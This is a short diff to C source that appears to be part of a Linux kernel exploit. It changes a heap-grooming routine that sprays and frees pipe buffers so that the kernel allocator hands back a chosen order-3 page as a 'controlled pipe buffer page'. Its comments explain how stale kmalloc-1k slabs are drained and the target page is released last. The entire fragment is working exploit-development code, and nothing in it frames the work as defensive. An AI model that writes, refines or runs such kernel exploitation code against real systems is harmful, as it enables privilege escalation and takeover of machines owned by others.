@@ -245,15 +245,23 @@ static int pipe_stage_exact_order3(uintptr_t base,
       allocated++;
   }
 
+  /* The drain pipes have already consumed the old kmalloc-1k partials.
+   * Shrink them while the probe still pins the target, then release the
+   * target last. Reclaim growth first reuses those old slabs and should take
+   * the now-newest order-3 page on its next slab allocation. */
+  for (size_t i = 0; i < PIPE_DRAIN; i++)
+    free_pipe_object(pipe_fds_drain[i]);
+
   int drained = pipe_drain_order3_probe(state, captured);
   close(state->probes[captured].sv[0]);
   close(state->probes[captured].sv[1]);
   state->probes[captured].sv[0] = -1;
   state->probes[captured].sv[1] = -1;
   pr_info("pipe order-3 oracle captured probe=%d allocated=%d guard=%d "
-          "drained=%d\n",
+          "drain_arrays=%d drained=%d\n",
           captured, allocated,
-          state->probes[guard].sv[0] >= 0 ? guard : -1, drained);
+          state->probes[guard].sv[0] >= 0 ? guard : -1,
+          PIPE_DRAIN, drained);
   return drained;
 }
 
@@ -276,9 +284,9 @@ static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
     return 0;
   }
 
-  /* Fill the kmalloc-1k cache with the drain population first. Releasing
-   * the exact mm slab then puts one known order-3 page into the allocator;
-   * the immediately following reclaim-pipe growth can take that page. */
+  /* Fill the kmalloc-1k cache with the drain population first. The exact
+   * target stays pinned by its probe while those arrays are shrunk; draining
+   * the probe then releases the target after the old slabs. */
   for (size_t i = 0; i < PIPE_DRAIN; i++)
     alloc_pipe_object(pipe_fds_drain[i]);
 
